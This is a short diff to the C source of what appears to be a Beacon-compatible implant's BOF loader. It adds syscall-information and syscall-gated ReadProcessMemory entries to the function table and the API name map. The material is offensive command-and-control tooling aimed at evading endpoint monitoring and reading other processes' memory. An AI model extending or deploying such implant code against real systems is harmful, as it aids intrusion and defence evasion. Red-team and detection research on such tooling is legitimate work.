@@ -18,6 +18,7 @@
 #include "bformat.h"
 #include "datastore.h"
 #include "gargleint.h"
+#include "syscalls.h"
 #include "sleepmask_bofwin.h"
 
 #define RELOC_ENDTABLE 0
@@ -227,6 +228,12 @@ typedef struct {
 	 * native download channel (tier-3 item 9). Beacon copies the buffer;
 	 * official cap 2GB. */
 	BOOL   (*BeaconDownload)(const char * filename, const char * buffer, unsigned int length);
+	/* 4.11 BeaconGetSyscallInformation (arsenal-kit 20251100 contract):
+	 * by-copy 36-entry SYSCALL_API + RTL table into the BOF's buffer.
+	 * 4.11 BeaconReadProcessMemory: gate wrapper honouring syscall_method.
+	 * Field order matches bapi.txt tail (BeaconDownload -> these two). */
+	BOOL   (*BeaconGetSyscallInformation)(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL resolveIfNotInitialized);
+	BOOL   (*BeaconReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead);
 
 	/* our other pointers: 4.12 Dynamic Import. The named API fields above
 	 * keep their offsets (BOFs compile against beacon.h field names); this
@@ -365,6 +372,8 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 	f->BeaconDataStoreUnprotectItem = BeaconDataStoreUnprotectItem;
 	f->BeaconDataStoreMaxEntries    = BeaconDataStoreMaxEntries;
 	f->BeaconDownload               = beacon_download_buffer;
+	f->BeaconGetSyscallInformation  = syscalls_fill_beacon_syscalls;
+	f->BeaconReadProcessMemory      = beacon_ReadProcessMemory;
 	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
 }
 
@@ -1162,6 +1171,8 @@ static const BOFPE_API_MAP bofpe_apis[] = {
 	{ "BeaconDataStoreMaxEntries",      offsetof(BOFF_FUNCTIONS, BeaconDataStoreMaxEntries) },
 	{ "BeaconGetCustomUserData",        offsetof(BOFF_FUNCTIONS, BeaconGetCustomUserData) },
 	{ "BeaconDownload",                 offsetof(BOFF_FUNCTIONS, BeaconDownload) },
+	{ "BeaconGetSyscallInformation",    offsetof(BOFF_FUNCTIONS, BeaconGetSyscallInformation) },
+	{ "BeaconReadProcessMemory",        offsetof(BOFF_FUNCTIONS, BeaconReadProcessMemory) },
 };
 
 static void * bofpe_resolve_api(BOFF_FUNCTIONS * f, const char * name) {
